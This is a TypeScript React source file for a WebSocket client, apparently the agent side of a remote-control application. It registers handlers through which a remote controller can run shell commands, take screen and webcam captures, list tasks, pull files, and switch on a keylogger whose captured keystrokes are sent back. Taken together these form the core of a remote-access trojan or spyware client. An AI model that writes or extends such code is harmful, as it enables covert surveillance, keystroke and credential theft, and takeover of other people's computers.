import { useKeyContextProvider } from "@/contexts/KeyContext";
import { env } from "@/shared/env.config";
import { createContext, useContext, useEffect, useRef, useState } from "react";
import { type Socket, io } from "socket.io-client";
import { toast } from "sonner";
import { DownloadingFile } from "./DownloadingFile";
import { WsApplication } from "./WsApplication";
import { useWsClient } from "./hooks/useWsClient";
import { WsService } from "./ws.service";
import { useWebcams } from "../webcam/hooks/useWebcams";
import { useSession } from "@/hooks/authentication";

export type Events =
  | "uploadFile"
  | "getFilesFolder"
  | "getFileFromClient"
  | "getTasksFromClient"
  | "runCmdCommand"
  | "connect"
  | "connected";

const WsClientContext = createContext<
  | {
      wss: Socket | null;
      connected: boolean;
      file: {
        progress: number;
        total: number;
        filename: string;
      };
      downloading: boolean;
      connect: (
        controllerid: string,
        tokenConnection: string,
        username: string,
        identifier: string
      ) => Promise<void>;
      disconnect: () => void;
    }
  | undefined
>(undefined);

export const WsClient: React.FC<{ children: React.ReactNode }> = ({
  children,
}) => {
  const { setWsService, file, downloading, UploadFile, AppendLog } =
    useWsClient();
  const [wss, setWss] = useState<Socket | null>(null);
  const [connected, setConnected] = useState<boolean>(false);
  const { token, isLoading } = useSession();
  const { setListening, keys } = useKeyContextProvider();
  const { listWebcams, takeScreenshotWebcam } = useWebcams();
  const keysRef = useRef<string[]>([]);

  // Update the ref whenever keys changes
  useEffect(() => {
    keysRef.current = keys;
  }, [keys]);

  const disconnect = () => {
    console.log("Disconnecting from ws-client", wss);
    if (wss) {
      console.log("Disconnecting from ws-client", wss);
      wss.disconnect();
      setWss(null);
      setConnected(false);
    } else {
      console.log("No WebSocket connection to disconnect");
    }
  };

  const connect = async (
    controllerid: string,
    tokenConnection: string,
    username: string,
    identifier: string
  ) => {
    if (!controllerid) {
      console.error("No controllerid id provided to connect function");
      return;
    }

    console.log("authtoken", token);

    console.log("Connecting to ws-client", controllerid, token);
    // Ensure URL and query params are fully constructed before connecting
    const socketUrl = `${env.VITE_WS_URL}/clients`;
    const socketOptions = {
      transports: ["websocket"],

      query: {
        controllerid: controllerid || "",
        identifier: identifier || "",
      },
      auth: {
        token,
        tokenConnection,
      },
      forceNew: true,
      reconnection: false,
    };

    const socket = io(socketUrl, socketOptions);

    setWss(socket);

    socket.on("connect", () => {
      console.log("Connected");
      setConnected(true);
    });

    socket.on("disconnect", () => {
      console.log("Disconnected");
      setWss(null);
      setConnected(false);
    });

    const wsService = new WsService(socket);
    setWsService(wsService);
    socket.on(
      "emitDisconnectFromController",
      (data: { controllerid: string }) => {
        console.log("emitDisconnectFromController", data);
        socket.disconnect();
      }
    );

    // socket.on("error", (error) => {
    //   console.log("Error", error);
    // });

    socket.on("getScreensFromClient", wsService.getScreensFromClient);

    socket.on("getScreenshot", wsService.getScreenshot);

    socket.on("uploadFile", (data: WS.UploadFile) => UploadFile(data, socket));

    socket.on("getFilesFolder", wsService.getFilesFolder);

    socket.on("getFileFromClient", (data: WS.GetFileFromClient) =>
      wsService.getFileFromClient(data, token as string)
    );

    socket.on("getTasksFromClient", wsService.getTasksFromClient);

    socket.on("runCmdCommand", wsService.runCmdCommand);

    socket.on("keylogger", (data: WS.RunKeyLogger) => {
      const { status } = data;

      setListening(status);
    });

    socket.on("keylogger:get-keys", () => {
      console.log("keylogger:get-keys", keysRef.current);

      socket.emit("keylogger:get-keys", {
        keys: keysRef.current, // Use the ref value instead of the closure-captured value
      });
    });

    socket.onAny((eventName: Events, ...args) => {
      AppendLog(eventName, username, ...args);
      console.log("onAny", eventName, args);
      if (eventName === "connected") return;
      // setPlaying(true);
      // refSoundSkype.current?.howler.play();

      // setTimeout(() => {
      //   setPlaying(false);
      //   refSoundSkype.current?.howler.stop();
      //   refSoundSkype.current?.howler.seek(0);
      // }, 500);

      toast(`Command ran: ${eventName}`);
    });
    socket.on("getCameras", async (data: { identifier: string }) => {
      const webcams = await listWebcams();
      console.log("webcams", webcams, data);
      socket.emit("getWebcams", {
        webcams,
        identifier: data.identifier,
      });
    });

    socket.on("screenshotWebcam", async (data: { webcamId: string }) => {
      const { webcamId } = data;
      console.log("webcamId", webcamId);
      const screenshot = await takeScreenshotWebcam(webcamId);
      console.log("screenshotWebcam", screenshot, data);
      socket.emit("screenshotWebcam", {
        screenshot,
        webcamId,
      });
    });
  };

  return (
    <WsClientContext.Provider
      value={{ wss, connect, disconnect, connected, file, downloading }}
    >
      <WsApplication connect={connect}>
        {children}

        <DownloadingFile />
      </WsApplication>
    </WsClientContext.Provider>
  );
};

export const useWsClientContext = () => {
  const context = useContext(WsClientContext);
  if (context === undefined) {
    throw new Error(
      "WsContextProvider must be used within a WsContextProvider"
    );
  }

  return context;
};
